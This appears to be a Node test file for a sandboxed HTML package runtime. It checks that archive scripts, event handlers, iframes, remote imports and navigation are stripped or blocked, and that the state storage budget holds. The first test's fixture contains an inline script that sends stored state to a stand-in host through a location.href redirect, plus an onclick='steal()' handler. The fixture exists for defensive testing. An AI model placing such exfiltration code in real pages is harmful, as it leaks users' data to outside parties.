import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import {parse} from 'parse5';
import {prepareHTMLDocument,sceneFromRelease} from '../../web/modules/runtime.mjs';
import {htmlWorkerSource} from '../../web/modules/html-worker.mjs';
import {workbenchMarkup} from '../../web/modules/app.mjs';
import {exampleModules,sharedScorePackage} from '../../web/modules/examples.mjs';
import {verifyArchive} from '../../packages/modules/sdk.mjs';
import {ModuleState} from '../../web/modules/host.mjs';
const bytes=s=>new TextEncoder().encode(s),H='0x'+'ab'.repeat(32);
const recovered=html=>({entrypoint:'index.html',manifest:{name:'worker-tool'},files:[{path:'index.html',mime:'text/html',bytes:bytes(html)}]});
const nodes=root=>[root,...(root.childNodes??[]).flatMap(nodes)];
test('HTML archive scripts never run in the navigable frame; only one trusted bootstrap runs with restrictive CSP',()=>{
 const html=prepareHTMLDocument(recovered('<h1 id="title">Example</h1><button id="button" onclick="steal()">Save</button><script>const secret = await anima.getState("draft"); location.href="https://example.test/?secret="+secret;</script><iframe src="https://example.test"></iframe><meta http-equiv="refresh" content="0;url=https://example.test">'),'trustednonce');
 const all=nodes(parse(html)),scripts=all.filter(n=>n.tagName==='script');assert.equal(scripts.length,1);assert.equal(scripts[0].attrs.find(a=>a.name==='nonce').value,'trustednonce');assert.match(scripts[0].childNodes[0].value,/new Worker\(url\)/);assert.match(scripts[0].childNodes[0].value,/workerBootstrap/);assert.match(html,/connect-src 'none'/);assert.match(html,/form-action 'none'/);assert.equal(all.filter(n=>n.tagName==='iframe').length,0);assert.ok(all.every(n=>!(n.attrs??[]).some(a=>a.name==='onclick')));
 const body=all.find(n=>n.tagName==='body');assert.equal(body.childNodes.at(-1).tagName,'script','trusted bootstrap starts only after the inert body exists');
});
test('HTML package asset resolution rejects remote paths and executable imports; markup cannot supply host DOM URL mutations',()=>{
 assert.throws(()=>prepareHTMLDocument(recovered('<script src="https://example.test/x.js"></script>'),'n'),/package-relative/);
 assert.throws(()=>prepareHTMLDocument(recovered('<script>import x from "./helper.mjs";</script>'),'n'),/Bundle executable/);
 const source=prepareHTMLDocument(recovered('<a id="out" href="https://example.test">out</a><script>document.querySelector("#out").textContent="safe";</script>'),'n');assert.match(source,/href="#"/);assert.match(source,/\['value','textContent','disabled','checked'\]/);assert.doesNotMatch(source,/element\[data\.property\].*innerHTML/);
});
test('worker DOM subset executes an independent tool and exposes no fetch, child worker or navigation-capable window',async()=>{
 const emitted=[],handlers=[];const location=Object.freeze({href:'blob:isolated'});const context=vm.createContext({postMessage:value=>emitted.push(value),addEventListener:(type,listener)=>{if(type==='message')handlers.push(listener);},location,fetch:()=>{throw Error('network must be removed');},Worker:class{},TextEncoder});
 Object.defineProperty(context,'location',{value:location,writable:false,configurable:false});
 vm.runInContext(htmlWorkerSource([`const button=document.getElementById('save');const out=document.querySelector('#output');out.textContent=[typeof fetch,typeof Worker,typeof window.open,typeof window.ethereum].join(',');button.addEventListener('click',()=>{out.textContent='saved';anima.setState('draft',{count:1});});`]),context,{timeout:1000});
 for(const listener of handlers)listener({data:{type:'init',nodes:[{id:'save',tagName:'BUTTON',textContent:'Save',value:''},{id:'output',tagName:'P',textContent:'',value:''}]}});await new Promise(resolve=>setImmediate(resolve));
 assert.ok(emitted.some(m=>m.type==='dom'&&m.value==='undefined,undefined,undefined,undefined'));
 for(const listener of handlers)listener({data:{type:'event',id:'save',event:'click',values:{textContent:'Save',value:''}}});await new Promise(resolve=>setImmediate(resolve));assert.ok(emitted.some(m=>m.type==='dom'&&m.value==='saved'));assert.ok(emitted.some(m=>m.type==='host'&&m.message.method==='state.set'));
 assert.throws(()=>vm.runInContext('"use strict"; location.href="https://example.test/"',context),/read only|Cannot assign/);assert.equal(location.href,'blob:isolated');
});
test('workbench shells have unique scoped form labels, separate signing and migration consent, and no autoconnect markup',()=>{
 const a=nodes(parse(workbenchMarkup('one'))),b=nodes(parse(workbenchMarkup('two')));const ids=tree=>tree.flatMap(n=>(n.attrs??[]).filter(a=>a.name==='id').map(a=>a.value));const first=ids(a),second=ids(b);assert.equal(new Set(first).size,first.length);assert.ok(first.every(id=>!second.includes(id)));
 for(const node of a)for(const attr of node.attrs??[])if(attr.name==='for')assert.ok(first.includes(attr.value));
 const html=workbenchMarkup('scope');assert.match(html,/Review personal inscription/);assert.match(html,/Sign this reviewed transaction/);assert.match(html,/data-node="state-consent"/);assert.match(html,/data-action="stage-state"/);assert.doesNotMatch(html,/onload=|onclick=|<script/);assert.match(html,/<option value="encrypted" selected>/);assert.match(html,/<option value="public">/);assert.match(html,/name="passphrase"[^>]+required/);assert.match(html,/data-action="export-journal"[^>]+disabled/);assert.match(html,/data-action="decrypt-journal"/);assert.match(html,/data-action="clear-journal-preview"/);
});
test('typed examples consume a recovered shared onchain-style dependency and preserve its actual audio values',async()=>{
 const library=await sharedScorePackage();const verified=await verifyArchive(library.manifest,library.archive);
 const modules=await exampleModules({sharedReleaseId:H});for(const item of modules.slice(0,2)){assert.deepEqual(item.manifest.dependencies,[H]);assert.throws(()=>sceneFromRelease(item),/dependency closure/);const scene=sceneFromRelease({...item,dependencies:[{...verified,releaseId:H}]});assert.deepEqual(scene.audio.frequencies,[174,261,348]);assert.equal(scene.audio.durationMs,8000);}
});
test('a declared zero-byte state budget never expands to the default allowance',()=>{
 const entries=new Map(),storage={getItem:k=>entries.get(k)??null,setItem:(k,v)=>entries.set(k,v)},address='0x'+'11'.repeat(20),identity={chainId:'1',collection:address,tokenId:'1',account:address,registry:address,owner:address,epoch:'1'};
 const state=new ModuleState({storage,identity,moduleKey:H,stateSchema:H,maxBytes:0});assert.equal(state.maxBytes,0);assert.throws(()=>state.set('draft','x'),/limit/);assert.equal(entries.size,0);
});
